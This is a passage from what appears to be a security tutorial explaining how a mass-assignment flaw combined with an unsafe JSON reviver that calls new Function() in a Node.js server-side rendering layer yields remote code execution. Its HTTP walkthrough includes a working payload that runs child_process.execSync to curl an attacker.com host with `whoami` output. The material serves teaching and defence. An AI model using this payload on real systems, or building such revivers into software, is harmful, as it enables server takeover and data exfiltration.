\[1] The architecture separates data retrieval from presentation, utilizing an intermediate Node.js Server-Side Rendering (SSR) layer to compile dynamic Javascript templates into static HTML for performance optimization, \[2] The backend API maintains complex tenant-specific configurations, including structural metadata (like custom Regex filters for dynamic forms), \[3] Because standard JSON cannot preserve programmatic logic, engineers introduced an advanced reviver/deserializer to reconstruct the application's true Isomorphic State. The SSR server fundamentally trusts that all structural configuration logic delivered by the internal API was safely authored by enterprise engineers, \[4] The execution sink. A seemingly isolated Mass Assignment flaw in the backend API allows a malicious tenant to inject arbitrary string data into their configuration blob. By formatting this string to perfectly match the syntactic signature expected by the SSR's dynamic reviver (e.g., beginning the string with `function()`), the attacker tricks the SSR layer. When the SSR server attempts to pre-render the page, the deserializer interprets the payload as legitimate state logic, passing it directly into the native Javascript evaluator (`new Function()`). This bridges an inert data storage vulnerability directly into asynchronous Server-Side Javascript RCE

```http
// 1. Attacker (Tenant Admin) interacts with a customization endpoint to update their storefront.
// 2. The attacker identifies a Mass Assignment vulnerability, allowing them to overwrite 
//    the generic 'customValidationRule' object stored in the BFF's NoSQL blob.

// 3. The attacker crafts an Immediately Invoked Function Expression (IIFE) payload that perfectly 
//    matches the hydration reviver's signature logic ("starts with function").

POST /api/v1/tenant/config HTTP/1.1
Host: bff.enterprise.tld
Authorization: Bearer <tenant_admin_token>
Content-Type: application/json

{
  "themeColor": "#FFFFFF",
  "customValidationRule": "function(){ return process.mainModule.require('child_process').execSync('curl http://attacker.com/`whoami`').toString(); }()"
}

// 4. The BFF merges the payload into the database safely. No execution occurs.
// 5. The attacker visits the public-facing storefront.
GET / HTTP/1.1
Host: tenant.enterprise.tld

// 6. The Node.js SSR Server receives the HTTP request.
// 7. The SSR Server requests the tenant configuration from the internal BFF.
// 8. The BFF returns the JSON payload.
// 9. The SSR Server parses the JSON utilizing the custom reviver.
// 10. The reviver extracts "customValidationRule". It observes the string starts with "function".
// 11. The reviver executes: new Function(`return function(){ return process.mainModule.require... }()`)();
// 12. The Javascript payload detonates on the SSR server, executing the bash command 
//     and exfiltrating the server's identity to the attacker's infrastructure before rendering the HTML.
```
{% endstep %}

{% step %}
To bridge the gap between static JSON data transport and active, Isomorphic Single Page Applications, architects deployed advanced deserialization functions within the Server-Side Rendering infrastructure. This optimization allowed backend APIs to transmit complex programmatic constructs (like validation algorithms and formatters) natively to the frontend execution space. The critical security failure arose from assigning implicit execution trust to the data's internal origin. The SSR nodes assumed that any configuration blob supplied by the internal API was mathematically safe. The attacker exploited a secondary flaw (Mass Assignment) on the external API edge to smuggle a hostile string into the backend storage layer. When the SSR engine pulled the state blob to pre-render the application, the custom JSON reviver pattern-matched the attacker's payload, interpreting it as legitimate operational logic. The reviver dynamically instantiated and evaluated the payload, collapsing an inert data ingestion pathway into devastating, cluster-wide Server-Side JavaScript Execution
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
